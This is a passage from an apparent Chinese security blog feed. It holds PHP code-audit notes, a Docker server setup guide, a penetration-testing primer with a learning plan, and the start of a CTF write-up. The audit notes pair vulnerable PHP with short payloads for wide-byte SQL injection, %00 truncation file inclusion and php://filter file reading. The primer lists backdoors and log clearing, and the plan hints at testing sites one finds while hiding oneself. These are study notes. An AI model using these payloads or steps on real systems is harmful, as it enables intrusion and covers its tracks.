class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(file_exists(&#x27;install.lock))&#123;</span><br><span class="line"></span><br><span class="line">header(&quot;Location:http://xxx.com&quot;);</span><br><span class="line"></span><br><span class="line">//exit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;test&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>test 依旧会被输出，替换成安装流程，PHP依旧会进行。</p><p>(2) 支付漏洞：</p><p>● 客户端修改单价</p><p>● 客户端修改总价和购买数量</p><p>● 服务端未校验严格</p><p>重复发包利用时间差：</p><p>#!php</p><?phpif (check_money($price)){//Do something//花费几秒$money = $money - $price;}?><p>可能导致漏洞函数： str_replace()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = addslashes($_GET[&#x27;a&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b = addslashes($_GET[&#x27;b&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;$a&lt;br&gt;$b&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$c = str_replace($a,&#x27;&#x27;,$b);</span><br><span class="line"></span><br><span class="line">echo trim($c);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>E.会话认证漏洞</p><p>COOKIE验证：没有使用SESSION验证，将信息直接保存在COOKIE中</p><p>a 找到传入sql语句的参数的传递过程 回溯变量到最原始的函数 看它保存在cookie的算法是否可逆<br>b 和MD5比起 sha1更安全 解密sha1的网站更少<br>c 限制一个用户只能同时在一个IP上登录审计代码时，查看登录处代码</p><p>F.二次漏洞</p><p>1.类型：</p><p>● 不是逻辑问题，是可信问题。</p><p>● 业务逻辑复杂度，与二次漏洞触发率 成正比。</p><p>● 购物车 &#x2F; 订单 &#x2F; 引用数据 &#x2F; 文章编辑 &#x2F; 草稿 &#x3D;&#x3D;&gt; SQL注入 &#x2F; XSS</p><p>2.技巧：</p><p>(1) 钻GPC等转义的空子：</p><p>● 不受GPC保护的$_SERVER变量：PHP5以后，$_SERVER取到的header不再受GPC影响，就算开启特殊字符也</p><p>编码问题转换：</p><p>a GBK的宽字节注入：%df ‘ 单引号自动被转义成(%5c)，同时%df与%5c连在一起组合成運字单引号依然</p><p>mb_convert_encoding()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt; &lt;?php</span><br><span class="line"></span><br><span class="line">$sql = &quot;WHERE id=&#x27;&quot;.urldecode(&quot;-1%df%5c&#x27; == &quot;).&quot;&#x27;&quot;; print_r(mb_convert_encoding($sql,&quot;UTF-8&quot;,&quot;GBK&quot;)); ?&gt;</span><br></pre></td></tr></table></figure><p>(2)字符串问题：</p><p>● 利用报错，找到敏感信息</p><h2 id="字符串截断："><a href="#字符串截断：" class="headerlink" title="字符串截断："></a>字符串截断：</h2><p>%00空字符截断：【PHP版本小于5.3】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[&#x27;file&#x27;].&#x27;.php&#x27;);</span><br><span class="line"></span><br><span class="line">//1.php?file=2.txt%00</span><br><span class="line"></span><br><span class="line">//2.txt里面是 &lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="iconv函数字符编码转换截断：【对PHP版本有要求】"><a href="#iconv函数字符编码转换截断：【对PHP版本有要求】" class="headerlink" title="iconv函数字符编码转换截断：【对PHP版本有要求】"></a>iconv函数字符编码转换截断：【对PHP版本有要求】</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">chr(128)—chr(255)可以截断字符</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = &#x27;1&#x27;.chr(130).&#x27;2’;</span><br><span class="line"></span><br><span class="line">echo $a.&quot;&lt;br&gt;&quot;; //12</span><br><span class="line"></span><br><span class="line">echo iconv(&quot;UTF-8&quot;, &quot;GBK&quot;, $a); //1</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="php-输入输出流："><a href="#php-输入输出流：" class="headerlink" title="php:&#x2F;&#x2F; 输入输出流："></a>php:&#x2F;&#x2F; 输入输出流：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include($_GET[‘file&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode(内容被base64编码)&#x2F; resource&#x3D;example.txt(远程文件)</p><h2 id="php代码解析标签："><a href="#php代码解析标签：" class="headerlink" title="php代码解析标签："></a>php代码解析标签：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a &lt;script language=&quot;php&quot;&gt;…&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">b &lt;?…?&gt;：php3.0.4版本后可用</span><br><span class="line"></span><br><span class="line">c &lt;%…%&gt;：asp标签，需要asp_tags=on，默认是 oﬀ </span><br></pre></td></tr></table></figure><p>正则表达式：</p><p>a 没有使用^ 和 $ 限定匹配开始位置：</p><p>b 特殊字符未转义：</p><p>报错注入：</p><p>windows findfirstfile<br>利用：<br>若要搜索12345.txt文件，可使用1&lt;&lt;来代替或者12&lt;&lt;，不可以单独使用一个”&lt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Setting Up an Intranet Server Using Docker</title>
      <link href="/2019/05/14/Setting-Up-an-Intranet-Server-Using-Docker/"/>
      <url>/2019/05/14/Setting-Up-an-Intranet-Server-Using-Docker/</url>
      
        <content type="html"><![CDATA[<h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="几条重要的命令"><a href="#几条重要的命令" class="headerlink" title="几条重要的命令"></a>几条重要的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">启动           systemctl start docker</span><br><span class="line">守护进程重启sudo systemctl daemon-reload</span><br><span class="line">列出容器        docker ps </span><br><span class="line">显示所有的容器，包括未运行的  docker ps -a</span><br><span class="line">重启docker服务  systemctl restart  docker</span><br><span class="line">重启docker服务  sudo service docker restart</span><br><span class="line">关闭docker      service docker stop   </span><br><span class="line">关闭docker      systemctl stop docker</span><br></pre></td></tr></table></figure><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><h4 id="通过桥接模式，搭建可通过外网访问的内网服务器"><a href="#通过桥接模式，搭建可通过外网访问的内网服务器" class="headerlink" title="通过桥接模式，搭建可通过外网访问的内网服务器"></a>通过桥接模式，搭建可通过外网访问的内网服务器</h4><p><strong>步骤</strong></p><ol><li>在 kali 中安装 docker </li><li>docker pull 下载镜像</li><li>配置静态ip<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ifconfig 查看当前网卡</span><br><span class="line">service networking stop 停止当前网卡网络服务</span><br><span class="line">vi /etc/network/interfaces 对网卡配置进行修改</span><br><span class="line">进去之后，你会发现这个界面内容</span><br><span class="line">································</span><br><span class="line"># The loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0 网卡</span><br><span class="line">#iface eth0 inet dhcp</span><br><span class="line">iface eth0 inet static  启用静态ip</span><br><span class="line">address 192.168.31.108  设置ip地址</span><br><span class="line">netmask 255.255.255.0   子网掩码</span><br><span class="line">gateway 192.168.31.1    网关</span><br><span class="line">·······························</span><br><span class="line">ESC :wq!</span><br><span class="line">service networking restart 重启网络服务</span><br></pre></td></tr></table></figure>4.虚拟机本地访问127.0.0.1测试<br>5.改防火墙权限<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ufw</span><br><span class="line">关闭  ufw disable</span><br><span class="line">开启  ufw enable</span><br></pre></td></tr></table></figure>6.连接ssh，down源码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssh hostname@ip -p xxxx 端口指向</span><br><span class="line">进入www目录（举例）</span><br><span class="line">cd /var/www/html</span><br><span class="line">打包html</span><br><span class="line">tar -cvf html.tar html </span><br><span class="line">移动html.tar到html</span><br><span class="line">mv html.tar html</span><br><span class="line">删除</span><br><span class="line">rm -f  强行删除某个文件</span><br><span class="line">rm -r  向下递归，不管有多少级目录，一并删除</span><br><span class="line">rm -rf 将会删除目录以及其下所有文件、文件夹</span><br><span class="line">访问ip/html.tar即可下载</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Introduction to Penetration Testing</title>
      <link href="/2019/05/14/Introduction-to-Penetration-Testing/"/>
      <url>/2019/05/14/Introduction-to-Penetration-Testing/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h2><h3 id="基于百度搜索引擎得到的结果："><a href="#基于百度搜索引擎得到的结果：" class="headerlink" title="基于百度搜索引擎得到的结果："></a>基于百度搜索引擎得到的结果：</h3><p>渗透测试（Penetration Test）是一种黑盒安全测试方法，安全专家通过模拟真实黑客的技术手段对目标进行漏洞检测，突破系统的安全防护手段，深入评估漏洞所可能造成的实际影响。</p><h2 id="渗透测试与入侵的区别"><a href="#渗透测试与入侵的区别" class="headerlink" title="渗透测试与入侵的区别"></a>渗透测试与入侵的区别</h2><h3 id="渗透测试："><a href="#渗透测试：" class="headerlink" title="渗透测试："></a>渗透测试：</h3><p>以安全为基本原则，通过攻击者以及防御者的角度去分析目标所存在的安全隐患以及脆弱性，以保护系统安全为最终目标。</p><h3 id="入侵："><a href="#入侵：" class="headerlink" title="入侵："></a>入侵：</h3><p>通过各种方法，甚至破坏性的操作，来获取系统权限以及各种敏感信息。</p><h3 id="一般的渗透测试流程：-基于Freebuf"><a href="#一般的渗透测试流程：-基于Freebuf" class="headerlink" title="一般的渗透测试流程：(基于Freebuf)"></a>一般的渗透测试流程：(基于Freebuf)</h3><p>1.明确目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">确定范围：测试目标的范围、ip、域名、内外网、测试账户。</span><br><span class="line"></span><br><span class="line">确定规则：能渗透到什么程度，所需要的时间、能否修改上传、能否提权、等等。</span><br><span class="line"></span><br><span class="line">确定需求：web应用的漏洞、业务逻辑漏洞、人员权限管理漏洞、等等。</span><br></pre></td></tr></table></figure><p>2.信息收集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">方式：主动扫描，开放搜索等。</span><br><span class="line"></span><br><span class="line">开放搜索：利用搜索引擎获得：后台、未授权页面、敏感url、等等。</span><br><span class="line"></span><br><span class="line">基础信息：IP、网段、域名、端口。</span><br><span class="line"></span><br><span class="line">应用信息：各端口的应用。例如web应用、邮件应用、等等。</span><br><span class="line"></span><br><span class="line">系统信息：操作系统版本</span><br><span class="line"></span><br><span class="line">版本信息：所有这些探测到的东西的版本。</span><br><span class="line"></span><br><span class="line">服务信息：中间件的各类信息，插件信息。</span><br><span class="line"></span><br><span class="line">人员信息：域名注册人员信息，web应用中发帖人的id，管理员姓名等。</span><br><span class="line"></span><br><span class="line">防护信息：试着看能否探测到防护设备。</span><br></pre></td></tr></table></figure><p>3.漏洞探测</p><p>利用上一步中列出的各种系统，应用等使用相应的漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line"></span><br><span class="line">(1)   漏扫，awvs，IBM appscan等。</span><br><span class="line"></span><br><span class="line">(2)   结合漏洞去exploit-db等位置找利用。</span><br><span class="line"></span><br><span class="line">(3)   在网上寻找验证poc。</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line"></span><br><span class="line">系统漏洞：系统没有及时打补丁</span><br><span class="line"></span><br><span class="line">WebSever漏洞：WebSever配置问题</span><br><span class="line"></span><br><span class="line">Web应用漏洞：Web应用开发问题</span><br><span class="line"></span><br><span class="line">其它端口服务漏洞：各种21/8080(st2)/7001/22/3389</span><br><span class="line"></span><br><span class="line">通信安全：明文传输，token在cookie中传送等。</span><br></pre></td></tr></table></figure><p>4.漏洞验证</p><p>将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验。成功后再应用于目标中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">自动化验证：结合自动化扫描工具提供的结果</span><br><span class="line"></span><br><span class="line">手工验证，根据公开资源进行验证</span><br><span class="line"></span><br><span class="line">试验验证：自己搭建模拟环境进行验证</span><br><span class="line"></span><br><span class="line">登陆猜解：有时可以尝试猜解一下登陆口的账号密码等信息</span><br><span class="line"></span><br><span class="line">业务漏洞验证：如发现业务漏洞，要进行验证</span><br></pre></td></tr></table></figure><p>公开资源的利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exploit-db/wooyun/</span><br><span class="line"></span><br><span class="line">google hacking</span><br><span class="line"></span><br><span class="line">渗透代码网站</span><br><span class="line"></span><br><span class="line">通用、缺省口令</span><br><span class="line"></span><br><span class="line">厂商的漏洞警告等等。</span><br></pre></td></tr></table></figure><p>5.信息分析<br>为下一步实施渗透做准备。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">精准打击：准备好上一步探测到的漏洞的exp，用来精准打击</span><br><span class="line"></span><br><span class="line">绕过防御机制：是否有防火墙等设备，如何绕过</span><br><span class="line"></span><br><span class="line">定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标</span><br><span class="line"></span><br><span class="line">绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀）</span><br><span class="line"></span><br><span class="line">攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等</span><br></pre></td></tr></table></figure><p>6.获取所需<br>实施攻击：根据前几步的结果，进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取内部信息：基础设施（网络连接，vpn，路由，拓扑等）</span><br><span class="line"></span><br><span class="line">进一步渗透：内网入侵，敏感目标</span><br><span class="line"></span><br><span class="line">持续性存在：一般我们对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等</span><br><span class="line"></span><br><span class="line">清理痕迹：清理相关日志（访问，操作），上传文件等</span><br></pre></td></tr></table></figure><p>7.信息整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">整理渗透工具：整理渗透过程中用到的代码，poc，exp等</span><br><span class="line"></span><br><span class="line">整理收集信息：整理渗透过程中收集到的一切信息</span><br><span class="line"></span><br><span class="line">整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息</span><br></pre></td></tr></table></figure><p>8.形成报告</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告</span><br><span class="line"></span><br><span class="line">补充介绍：要对漏洞成因，验证过程和带来危害进行分析</span><br><span class="line"></span><br><span class="line">修补建议：当然要对所有产生的问题提出合理高效安全的解决办法</span><br></pre></td></tr></table></figure><h3 id="学习规划-基于CnHacker"><a href="#学习规划-基于CnHacker" class="headerlink" title="学习规划: (基于CnHacker)"></a>学习规划: (基于CnHacker)</h3><p>基础：Web安全相关概念</p><blockquote><p>熟悉基本概念（SQL注入、上传、XSS、CSRF、一句话木马等）.</p></blockquote><blockquote><p>通过关键字（SQL注入、上传、XSS、CSRF、一句话木马等）进行Google&#x2F;SecWiki；</p></blockquote><blockquote><p>阅读《精通脚本黑客》，虽然很旧也有错误，但是入门还是可以的；</p></blockquote><blockquote><p>看一些渗透笔记&#x2F;视频，了解渗透实战的整个过程，可以Google（渗透笔记、渗透过程、入侵过程等）；</p></blockquote><p>3周<br>熟悉渗透相关工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">熟悉AWVS、sqlmap、Burp、nessus、chopper、nmap、Appscan等相关工具的使用。</span><br><span class="line">了解该类工具的用途和使用场景，先用软件名字Google/SecWiki；</span><br><span class="line">下载无后们版的这些软件进行安装；</span><br><span class="line">学习并进行使用，具体教材可以在SecWiki上搜索，例如：Brup的教程、sqlmap；</span><br><span class="line">待常用的这几个软件都学会了可以安装音速启动做一个渗透工具箱；</span><br></pre></td></tr></table></figure><p>5周<br>渗透实战操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">掌握渗透的整个阶段并能够独立渗透小型站点。</span><br><span class="line">网上找渗透视频看并思考其中的思路和原理，关键字（渗透、SQL注入视频、文件上传入侵、数据库备份、dedecms漏洞利用等等）；</span><br><span class="line">自己找站点/搭建测试环境进行测试，记住请隐藏好你自己；</span><br><span class="line">思考渗透主要分为几个阶段，每个阶段需要做那些工作，例如这个：PTES渗透测试执行标准；</span><br><span class="line">研究SQL注入的种类、注入原理、手动注入技巧；</span><br><span class="line">研究文件上传的原理，如何进行截断、双重后缀欺骗(IIS、PHP)、解析漏洞利用（IIS、Nignix、Apache）等，参照：上传攻击框架；</span><br><span class="line">研究XSS形成的原理和种类，具体学习方法可以Google/SecWiki，可以参考：XSS；</span><br><span class="line">研究Windows/Linux提权的方法和具体使用，可以参考：提权；</span><br><span class="line">可以参考: 开源渗透测试脆弱系统；</span><br></pre></td></tr></table></figure><p>1周<br>关注安全圈动态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">关注安全圈的最新漏洞、安全事件与技术文章。</span><br><span class="line">通过SecWiki浏览每日的安全技术文章/事件；</span><br><span class="line">通过Weibo/twitter关注安全圈的从业人员（遇到大牛的关注或者好友果断关注），天天抽时间刷一下；</span><br><span class="line">通过feedly/鲜果订阅国内外安全技术博客（不要仅限于国内，平时多注意积累），没有订阅源的可以看一下SecWiki的聚合栏目；</span><br><span class="line">养成习惯，每天主动提交安全技术文章链接到SecWiki进行积淀；</span><br><span class="line">多关注下最新漏洞列表，推荐几个：exploit-db、CVE中文库、Wooyun等，遇到公开的漏洞都去实践下。</span><br><span class="line">关注国内国际上的安全会议的议题或者录像，推荐SecWiki-Conference。</span><br></pre></td></tr></table></figure><p>3周<br>熟悉Windows&#x2F;Kali Linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">学习Windows/Kali Linux基本命令、常用工具；</span><br><span class="line">熟悉Windows下的常用的cmd命令，例如：ipconfig,nslookup,tracert,net,tasklist,taskkill等；</span><br><span class="line">熟悉Linux下的常用命令，例如：ifconfig,ls,cp,mv,vi,wget,service,sudo等；</span><br><span class="line">熟悉Kali Linux系统下的常用工具，可以参考SecWiki,《Web Penetration Testing with Kali Linux》、《Hacking with Kali》等；</span><br><span class="line">熟悉metasploit工具，可以参考SecWiki、《Metasploit渗透测试指南》。</span><br></pre></td></tr></table></figure><p>3周<br>服务器安全配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">学习服务器环境配置，并能通过思考发现配置存在的安全问题。</span><br><span class="line">Windows2003/2008环境下的IIS配置，特别注意配置安全和运行权限，可以参考：SecWiki-配置；</span><br><span class="line">Linux环境下的LAMP的安全配置，主要考虑运行权限、跨目录、文件夹权限等，可以参考：SecWiki-配置；</span><br><span class="line">远程系统加固，限制用户名和口令登陆，通过iptables限制端口；</span><br><span class="line">配置软件Waf加强系统安全，在服务器配置mod_security等系统，参见SecWiki-ModSecurity；</span><br><span class="line">通过Nessus软件对配置环境进行安全检测，发现未知安全威胁。</span><br></pre></td></tr></table></figure><p>4周<br>脚本编程学习</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">选择脚本语言Perl/Python/PHP/Go/Java中的一种，对常用库进行编程学习。</span><br><span class="line">搭建开发环境和选择IDE，PHP环境推荐Wamp和XAMPP，IDE强烈推荐Sublime，一些Sublime的技巧：SecWiki-Sublime；</span><br><span class="line">Python编程学习，学习内容包含：语法、正则、文件、网络、多线程等常用库，推荐《Python核心编程》，不要看完；</span><br><span class="line">用Python编写漏洞的exp，然后写一个简单的网络爬虫，可参见SecWiki-爬虫、视频；</span><br><span class="line">PHP基本语法学习并书写一个简单的博客系统，参见《PHP与MySQL程序设计（第4版）》、视频；</span><br><span class="line">熟悉MVC架构，并试着学习一个PHP框架或者Python框架（可选）；</span><br><span class="line">了解Bootstrap的布局或者CSS，可以参考：SecWiki-Bootstrap;</span><br></pre></td></tr></table></figure><p>3周 源码审计与漏洞分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">能独立分析脚本源码程序并发现安全问题。</span><br><span class="line">熟悉源码审计的动态和静态方法，并知道如何去分析程序，参见SecWiki-审计；</span><br><span class="line">从Wooyun上寻找开源程序的漏洞进行分析并试着自己分析；</span><br><span class="line">了解Web漏洞的形成原因，然后通过关键字进行查找分析，参见SecWiki-代码审计、高级PHP应用程序漏洞审核技术；</span><br><span class="line">研究Web漏洞形成原理和如何从源码层面避免该类漏洞，并整理成checklist。</span><br></pre></td></tr></table></figure><p>5周<br>安全体系设计与开发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">能建立自己的安全体系，并能提出一些安全建议或者系统架构。</span><br><span class="line">开发一些实用的安全小工具并开源，体现个人实力；</span><br><span class="line">建立自己的安全体系，对公司安全有自己的一些认识和见解；</span><br><span class="line">提出或者加入大型安全系统的架构或者开发；</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC 2019-MISC</title>
      <link href="/2019/05/14/ISCC2019-MISC/"/>
      <url>/2019/05/14/ISCC2019-MISC/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>进制——&gt;ASCII——&gt;base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113&#x27;</span></span><br><span class="line">tmp = <span class="built_in">str</span>.split( )</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">8</span>))</span><br><span class="line"><span 